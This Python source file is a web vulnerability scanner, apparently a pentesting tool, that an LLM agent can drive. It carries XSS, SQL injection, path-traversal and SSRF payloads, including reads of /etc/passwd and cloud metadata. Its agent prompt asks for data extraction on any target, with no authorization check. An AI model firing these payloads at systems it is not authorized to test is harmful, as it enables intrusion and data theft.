"""
VulnHunter - Fast, Smart Vulnerability Scanner
Redesigned for speed, accuracy, and real exploitation
"""

import re
import json
import asyncio
import aiohttp
import time
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

try:
    import ollama
    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False


@dataclass
class Vulnerability:
    """Confirmed vulnerability"""
    vuln_type: str
    url: str
    param: str
    payload: str
    evidence: str
    severity: str
    confirmed: bool
    extracted_data: Optional[str] = None
    
    def to_dict(self):
        return {
            "type": self.vuln_type,
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "confirmed": self.confirmed,
            "extracted_data": self.extracted_data
        }


class FastScanner:
    """
    Ultra-fast parallel vulnerability scanner
    - Async HTTP for speed
    - Smart payload generation
    - Confirms vulnerabilities before reporting
    - Extracts data to prove impact
    """
    
    def __init__(self, timeout: int = 10, max_concurrent: int = 20):
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.max_concurrent = max_concurrent
        self.findings: List[Vulnerability] = []
        self.tested_urls: set = set()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        
        # Smart payloads - fewer but more effective
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '${alert(1)}',
            '{{constructor.constructor("alert(1)")()}}',
        ]
        
        self.sqli_payloads = [
            ("'", ["sql syntax", "mysql", "sqlite", "postgresql", "ora-", "unclosed quotation"]),
            ("' OR '1'='1", ["sql syntax", "warning"]),
            ("' OR 1=1--", ["sql syntax", "warning"]),
            ("1' AND '1'='1", []),
            ("1' AND '1'='2", []),
            ("' UNION SELECT NULL--", ["sql syntax", "column"]),
            ("'; SELECT SLEEP(3)--", []),
        ]
        
        self.lfi_payloads = [
            ("../../../etc/passwd", ["root:", "nobody:", "/bin/"]),
            ("....//....//....//etc/passwd", ["root:", "nobody:"]),
            ("..\\..\\..\\windows\\win.ini", ["[fonts]", "[extensions]"]),
            ("/etc/passwd", ["root:", "nobody:"]),
            ("file:///etc/passwd", ["root:", "nobody:"]),
            ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),
        ]
        
        self.ssrf_payloads = [
            ("http://127.0.0.1", ["localhost", "127.0.0.1"]),
            ("http://localhost", ["localhost"]),
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"]),
            ("http://[::1]", ["localhost"]),
            ("http://0.0.0.0", []),
            ("http://metadata.google.internal/", ["instance"]),
        ]

    async def _fetch(self, session: aiohttp.ClientSession, url: str, 
                     method: str = "GET", data: Optional[Dict] = None) -> Tuple[str, int, float]:
        """Fast async fetch with timing"""
        start = time.time()
        try:
            if method == "POST":
                async with session.post(url, data=data, headers=self.headers, 
                                        ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    return body, resp.status, time.time() - start
            else:
                async with session.get(url, headers=self.headers, 
                                       ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    return body, resp.status, time.time() - start
        except Exception as e:
            return str(e), 0, time.time() - start

    async def _verify_url(self, session: aiohttp.ClientSession, url: str) -> bool:
        """Verify URL exists before testing"""
        try:
            async with session.head(url, headers=self.headers, 
                                    ssl=False, allow_redirects=True, timeout=self.timeout) as resp:
                return resp.status < 500
        except:
            try:
                async with session.get(url, headers=self.headers, 
                                       ssl=False, allow_redirects=True, timeout=self.timeout) as resp:
                    return resp.status < 500
            except:
                return False

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    async def find_forms_and_params(self, url: str) -> Dict[str, Any]:
        """
        Fast form and parameter discovery
        Returns forms, URL params, and internal links
        """
        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            body, status, _ = await self._fetch(session, url)
            
            if status == 0:
                return {"error": "Failed to fetch URL", "forms": [], "params": [], "links": []}
            
            base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            
            # Extract forms
            forms = []
            form_pattern = r'<form([^>]*)>(.*?)</form>'
            for match in re.finditer(form_pattern, body, re.IGNORECASE | re.DOTALL):
                attrs, content = match.groups()
                
                action = re.search(r'action=["\']([^"\']*)["\']', attrs)
                method = re.search(r'method=["\']([^"\']*)["\']', attrs)
                
                action_url = urljoin(url, action.group(1)) if action else url
                form_method = method.group(1).upper() if method else "GET"
                
                # Get inputs
                inputs = []
                for inp in re.finditer(r'<input([^>]*)/?>', content, re.IGNORECASE):
                    inp_attrs = inp.group(1)
                    name = re.search(r'name=["\']([^"\']*)["\']', inp_attrs)
                    inp_type = re.search(r'type=["\']([^"\']*)["\']', inp_attrs)
                    if name:
                        inputs.append({
                            "name": name.group(1),
                            "type": inp_type.group(1) if inp_type else "text"
                        })
                
                # Get textareas
                for ta in re.finditer(r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE):
                    inputs.append({"name": ta.group(1), "type": "textarea"})
                
                if inputs:
                    forms.append({
                        "action": action_url,
                        "method": form_method,
                        "inputs": inputs
                    })
            
            # Extract URL parameters from links
            params_found = set()
            link_pattern = r'href=["\']([^"\']*\?[^"\']*)["\']'
            for match in re.finditer(link_pattern, body, re.IGNORECASE):
                href = match.group(1)
                full_url = urljoin(url, href)
                parsed = urlparse(full_url)
                for p in parse_qs(parsed.query).keys():
                    params_found.add(p)
            
            # Extract internal links (same domain only)
            internal_links = set()
            all_links = re.findall(r'href=["\']([^"\']+)["\']', body, re.IGNORECASE)
            for link in all_links:
                if link.startswith('#') or link.startswith('javascript:') or link.startswith('mailto:'):
                    continue
                full_link = urljoin(url, link)
                if urlparse(full_link).netloc == urlparse(url).netloc:
                    internal_links.add(full_link.split('#')[0])
            
            # Verify top links actually exist
            verified_links = []
            tasks = [self._verify_url(session, link) for link in list(internal_links)[:30]]
            results = await asyncio.gather(*tasks)
            for link, exists in zip(list(internal_links)[:30], results):
                if exists:
                    verified_links.append(link)
            
            return {
                "forms": forms,
                "params": list(params_found),
                "links": verified_links[:20],
                "total_links": len(internal_links)
            }

    async def test_xss(self, url: str, param: str) -> List[Vulnerability]:
        """Fast XSS testing with confirmation - checks for HTML context"""
        results = []
        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            # First verify URL works
            if not await self._verify_url(session, url):
                return results
            
            # Get baseline to check content type
            baseline, status, _ = await self._fetch(session, url)
            if not status:
                return results
            
            # Only test if response looks like HTML (not JSON/XML API)
            is_html = '<html' in baseline.lower() or '<body' in baseline.lower() or '<!doctype' in baseline.lower()
            
            for payload in self.xss_payloads:
                test_url = self._inject_param(url, param, payload)
                body, status, _ = await self._fetch(session, test_url)
                
                if status and payload in body:
                    # Check if it's truly reflected in HTML context (not JSON)
                    body_lower = body.lower()
                    in_html_context = (is_html or '<html' in body_lower or '<body' in body_lower)
                    not_in_json = '"args"' not in body_lower and '"test"' not in body_lower
                    
                    if in_html_context or not_in_json:
                        results.append(Vulnerability(
                            vuln_type="XSS",
                            url=url,
                            param=param,
                            payload=payload,
                            evidence=f"Payload reflected in HTML response",
                            severity="high",
                            confirmed=True
                        ))
                        break  # Found confirmed XSS, stop testing
        
        return results

    async def test_sqli(self, url: str, param: str) -> List[Vulnerability]:
        """Fast SQLi testing with confirmation and data extraction"""
        results = []
        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            if not await self._verify_url(session, url):
                return results
            
            # Get baseline response
            baseline_body, baseline_status, baseline_time = await self._fetch(session, url)
            baseline_len = len(baseline_body)
            
            for payload, error_patterns in self.sqli_payloads:
                test_url = self._inject_param(url, param, payload)
                body, status, elapsed = await self._fetch(session, test_url)
                
                # Check for SQL errors
                body_lower = body.lower()
                for pattern in error_patterns:
                    if pattern in body_lower:
                        # Try to extract database info
                        db_info = self._extract_db_info(body)
                        results.append(Vulnerability(
                            vuln_type="SQLi",
                            url=url,
                            param=param,
                            payload=payload,
                            evidence=f"SQL error detected: {pattern}",
                            severity="critical",
                            confirmed=True,
                            extracted_data=db_info
                        ))
                        
                        # Try to extract data with UNION
                        await self._try_union_extract(session, url, param, results)
                        return results
            
            # Boolean-based detection
            true_url = self._inject_param(url, param, "1' AND '1'='1")
            false_url = self._inject_param(url, param, "1' AND '1'='2")
            
            true_body, _, _ = await self._fetch(session, true_url)
            false_body, _, _ = await self._fetch(session, false_url)
            
            if len(true_body) != len(false_body) and abs(len(true_body) - len(false_body)) > 50:
                results.append(Vulnerability(
                    vuln_type="SQLi (Boolean)",
                    url=url,
                    param=param,
                    payload="1' AND '1'='1 vs 1' AND '1'='2",
                    evidence=f"Response length differs: {len(true_body)} vs {len(false_body)}",
                    severity="critical",
                    confirmed=True
                ))
            
            # Time-based detection
            time_url = self._inject_param(url, param, "1' AND SLEEP(3)--")
            _, _, elapsed = await self._fetch(session, time_url)
            
            if elapsed > 2.5:
                results.append(Vulnerability(
                    vuln_type="SQLi (Time-based)",
                    url=url,
                    param=param,
                    payload="1' AND SLEEP(3)--",
                    evidence=f"Response delayed by {elapsed:.2f}s",
                    severity="critical",
                    confirmed=True
                ))
        
        return results

    def _extract_db_info(self, body: str) -> Optional[str]:
        """Extract database information from error messages"""
        patterns = [
            (r"MySQL server version.*?'", "MySQL version found"),
            (r"PostgreSQL.*?ERROR", "PostgreSQL detected"),
            (r"Microsoft SQL Server", "MSSQL detected"),
            (r"ORA-\d{5}", "Oracle detected"),
            (r"SQLite.*?error", "SQLite detected"),
        ]
        for pattern, msg in patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return msg
        return None

    async def _try_union_extract(self, session: aiohttp.ClientSession, 
                                  url: str, param: str, results: List[Vulnerability]):
        """Try to extract data using UNION injection"""
        for cols in range(1, 10):
            nulls = ",".join(["NULL"] * cols)
            union_payload = f"' UNION SELECT {nulls}--"
            test_url = self._inject_param(url, param, union_payload)
            body, status, _ = await self._fetch(session, test_url)
            
            if status == 200 and "error" not in body.lower():
                # Try to extract version
                version_payload = f"' UNION SELECT {'NULL,'*(cols-1)}@@version--"
                test_url = self._inject_param(url, param, version_payload)
                body, _, _ = await self._fetch(session, test_url)
                
                if "@@version" not in body and status == 200:
                    results.append(Vulnerability(
                        vuln_type="SQLi (UNION)",
                        url=url,
                        param=param,
                        payload=version_payload,
                        evidence=f"UNION injection with {cols} columns works",
                        severity="critical",
                        confirmed=True,
                        extracted_data=f"Columns: {cols}"
                    ))
                break

    async def test_lfi(self, url: str, param: str) -> List[Vulnerability]:
        """Fast LFI testing with confirmation"""
        results = []
        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            if not await self._verify_url(session, url):
                return results
            
            for payload, indicators in self.lfi_payloads:
                test_url = self._inject_param(url, param, payload)
                body, status, _ = await self._fetch(session, test_url)
                
                if status:
                    for indicator in indicators:
                        if indicator in body:
                            # Extract some file content as proof
                            extract = body[:500] if "root:" in body else None
                            results.append(Vulnerability(
                                vuln_type="LFI",
                                url=url,
                                param=param,
                                payload=payload,
                                evidence=f"File content indicator found: {indicator}",
                                severity="critical",
                                confirmed=True,
                                extracted_data=extract
                            ))
                            return results
        
        return results

    async def test_ssrf(self, url: str, param: str) -> List[Vulnerability]:
        """Fast SSRF testing - confirms actual internal resource access"""
        results = []
        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            if not await self._verify_url(session, url):
                return results
            
            # Get baseline to compare
            baseline, baseline_status, _ = await self._fetch(session, url)
            
            for payload, indicators in self.ssrf_payloads:
                test_url = self._inject_param(url, param, payload)
                body, status, _ = await self._fetch(session, test_url)
                
                if status:
                    # Check for real SSRF indicators (not just reflection)
                    body_lower = body.lower()
                    
                    # Skip if this looks like simple reflection (JSON echo)
                    if f'"{payload.lower()}"' in body_lower or f':{payload.lower()}' in body_lower:
                        # This is likely just echoing the URL, not fetching it
                        continue
                    
                    for indicator in indicators:
                        if indicator.lower() in body_lower:
                            # Additional check: indicator shouldn't be in baseline
                            if indicator.lower() not in baseline.lower():
                                results.append(Vulnerability(
                                    vuln_type="SSRF",
                                    url=url,
                                    param=param,
                                    payload=payload,
                                    evidence=f"Internal resource accessed: {indicator}",
                                    severity="critical",
                                    confirmed=True,
                                    extracted_data=body[:500] if "ami-id" in body or "instance" in body else None
                                ))
                                return results
        
        return results

    async def full_scan(self, target_url: str) -> Dict[str, Any]:
        """
        Complete fast scan of target
        1. Discover forms and parameters
        2. Test all parameters in parallel
        3. Return only confirmed vulnerabilities
        """
        start_time = time.time()
        
        # Step 1: Fast discovery
        discovery = await self.find_forms_and_params(target_url)
        
        if "error" in discovery:
            return {"error": discovery["error"], "vulns": []}
        
        all_vulns = []
        
        # Step 2: Build test targets
        test_targets = []
        
        # From URL parameters
        parsed = urlparse(target_url)
        url_params = parse_qs(parsed.query)
        for param in url_params:
            test_targets.append((target_url, param))
        
        # From discovered links with params
        for link in discovery["links"]:
            parsed = urlparse(link)
            for param in parse_qs(parsed.query):
                test_targets.append((link, param))
        
        # From forms
        for form in discovery["forms"]:
            for inp in form["inputs"]:
                if inp["type"] not in ["submit", "button", "hidden"]:
                    # Build test URL for form
                    form_url = form["action"]
                    if "?" not in form_url:
                        form_url += f"?{inp['name']}=test"
                    test_targets.append((form_url, inp["name"]))
        
        # Step 3: Parallel testing
        async def test_all(url: str, param: str):
            vulns = []
            vulns.extend(await self.test_xss(url, param))
            vulns.extend(await self.test_sqli(url, param))
            vulns.extend(await self.test_lfi(url, param))
            vulns.extend(await self.test_ssrf(url, param))
            return vulns
        
        # Limit concurrent tests
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def bounded_test(url: str, param: str):
            async with semaphore:
                return await test_all(url, param)
        
        tasks = [bounded_test(url, param) for url, param in test_targets[:50]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, list):
                all_vulns.extend(result)
        
        elapsed = time.time() - start_time
        
        return {
            "target": target_url,
            "scan_time_seconds": round(elapsed, 2),
            "forms_found": len(discovery["forms"]),
            "params_tested": len(test_targets),
            "links_found": len(discovery["links"]),
            "vulnerabilities": [v.to_dict() for v in all_vulns],
            "vuln_count": len(all_vulns)
        }


class VulnHunterLLM:
    """
    LLM-powered vulnerability hunter
    Uses tools for fast, accurate scanning
    """
    
    def __init__(self, model: str = "llama3.1:8b", proxy: Optional[str] = None):
        self.model = model
        self.scanner = FastScanner()
        self.conversation: List[Dict] = []
        self.findings: List[Dict] = []
        self.target_url = ""
        
        self.system_prompt = """You are VulnHunter, an expert security researcher. You have tools to scan web apps for vulnerabilities.

## Your Tools
1. **discover(url)** - Find forms, parameters, and internal links
2. **scan(url)** - Full vulnerability scan (XSS, SQLi, LFI, SSRF)
3. **test_xss(url, param)** - Test specific parameter for XSS
4. **test_sqli(url, param)** - Test for SQL injection
5. **test_lfi(url, param)** - Test for file inclusion
6. **test_ssrf(url, param)** - Test for SSRF
7. **report()** - Get all confirmed vulnerabilities

## Usage
Call tools with: TOOL: tool_name(url="...", param="...")

Example workflow:
1. TOOL: discover(url="https://target.com") - Find attack surface
2. TOOL: scan(url="https://target.com/search?q=test") - Scan a page
3. TOOL: test_sqli(url="https://target.com/user?id=1", param="id") - Deep SQLi test
4. TOOL: report() - Show confirmed findings

## Rules
- Only report CONFIRMED vulnerabilities with proof
- Extract data to demonstrate impact
- Test all discovered parameters
- Be fast and thorough"""

    def _run_async(self, coro):
        """Run async code in sync context"""
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)

    def discover(self, url: str) -> Dict:
        """Discover forms and parameters"""
        return self._run_async(self.scanner.find_forms_and_params(url))

    def scan(self, url: str) -> Dict:
        """Full vulnerability scan"""
        result = self._run_async(self.scanner.full_scan(url))
        self.findings.extend(result.get("vulnerabilities", []))
        return result

    def test_xss(self, url: str, param: str) -> List[Dict]:
        """Test for XSS"""
        vulns = self._run_async(self.scanner.test_xss(url, param))
        for v in vulns:
            self.findings.append(v.to_dict())
        return [v.to_dict() for v in vulns]

    def test_sqli(self, url: str, param: str) -> List[Dict]:
        """Test for SQLi"""
        vulns = self._run_async(self.scanner.test_sqli(url, param))
        for v in vulns:
            self.findings.append(v.to_dict())
        return [v.to_dict() for v in vulns]

    def test_lfi(self, url: str, param: str) -> List[Dict]:
        """Test for LFI"""
        vulns = self._run_async(self.scanner.test_lfi(url, param))
        for v in vulns:
            self.findings.append(v.to_dict())
        return [v.to_dict() for v in vulns]

    def test_ssrf(self, url: str, param: str) -> List[Dict]:
        """Test for SSRF"""
        vulns = self._run_async(self.scanner.test_ssrf(url, param))
        for v in vulns:
            self.findings.append(v.to_dict())
        return [v.to_dict() for v in vulns]

    def report(self) -> List[Dict]:
        """Get all findings"""
        return self.findings

    def _execute_tool(self, tool_name: str, args: Dict) -> str:
        """Execute a tool call"""
        tools = {
            "discover": lambda: self.discover(args.get("url", self.target_url)),
            "scan": lambda: self.scan(args.get("url", self.target_url)),
            "test_xss": lambda: self.test_xss(args.get("url"), args.get("param")),
            "test_sqli": lambda: self.test_sqli(args.get("url"), args.get("param")),
            "test_lfi": lambda: self.test_lfi(args.get("url"), args.get("param")),
            "test_ssrf": lambda: self.test_ssrf(args.get("url"), args.get("param")),
            "report": lambda: self.report(),
        }
        
        if tool_name not in tools:
            return json.dumps({"error": f"Unknown tool: {tool_name}"})
        
        try:
            result = tools[tool_name]()
            return json.dumps(result, indent=2, default=str)
        except Exception as e:
            return json.dumps({"error": str(e)})

    def _parse_tool_call(self, text: str) -> Optional[Dict]:
        """Parse tool call from LLM response"""
        pattern = r'TOOL:\s*(\w+)\((.*?)\)'
        match = re.search(pattern, text, re.DOTALL)
        
        if not match:
            return None
        
        tool_name = match.group(1)
        args_str = match.group(2)
        
        args = {}
        for m in re.finditer(r'(\w+)\s*=\s*["\']([^"\']*)["\']', args_str):
            args[m.group(1)] = m.group(2)
        
        return {"tool": tool_name, "args": args}

    def chat(self, message: str) -> str:
        """Chat with LLM and execute tools"""
        if not OLLAMA_AVAILABLE:
            return "Ollama not installed. Run: pip install ollama"
        
        self.conversation.append({"role": "user", "content": message})
        
        messages = [
            {"role": "system", "content": self.system_prompt},
            *self.conversation
        ]
        
        try:
            response = ollama.chat(model=self.model, messages=messages)
            reply = response['message']['content']
            
            # Check for tool call
            tool_call = self._parse_tool_call(reply)
            if tool_call:
                result = self._execute_tool(tool_call["tool"], tool_call["args"])
                self.conversation.append({"role": "assistant", "content": reply})
                self.conversation.append({
                    "role": "user", 
                    "content": f"Tool result:\n```json\n{result}\n```\nAnalyze and continue."
                })
                return self.chat("")  # Continue conversation
            
            self.conversation.append({"role": "assistant", "content": reply})
            return reply
            
        except Exception as e:
            return f"Error: {e}"

    def start(self, target_url: str) -> str:
        """Start hunting on target"""
        self.target_url = target_url
        self.conversation = []
        self.findings = []
        
        return self.chat(f"""Hunt for vulnerabilities on: {target_url}

1. First discover forms and parameters
2. Then scan for XSS, SQLi, LFI, SSRF
3. Confirm and report only real vulnerabilities with proof
4. Extract data to demonstrate impact

Start now!""")

    def continue_hunt(self, instruction: str = "") -> str:
        """Continue hunting"""
        return self.chat(instruction or "Continue scanning and report findings.")

    def get_report(self) -> str:
        """Get formatted report"""
        if not self.findings:
            return "No confirmed vulnerabilities found."
        
        report = f"# Vulnerability Report\n"
        report += f"**Target:** {self.target_url}\n"
        report += f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
        report += f"**Total Findings:** {len(self.findings)}\n\n"
        
        for i, v in enumerate(self.findings, 1):
            report += f"## {i}. {v['type']} - {v['severity'].upper()}\n"
            report += f"- **URL:** {v['url']}\n"
            report += f"- **Parameter:** {v['param']}\n"
            report += f"- **Payload:** `{v['payload']}`\n"
            report += f"- **Evidence:** {v['evidence']}\n"
            if v.get('extracted_data'):
                report += f"- **Extracted Data:** {v['extracted_data'][:200]}\n"
            report += "\n"
        
        return report


def quick_scan(url: str) -> Dict:
    """Quick standalone scan without LLM"""
    scanner = FastScanner()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(scanner.full_scan(url))


def manual_scan(url: str, scan_type: str = "all") -> Dict:
    """Manual scan for CLI usage"""
    return quick_scan(url)
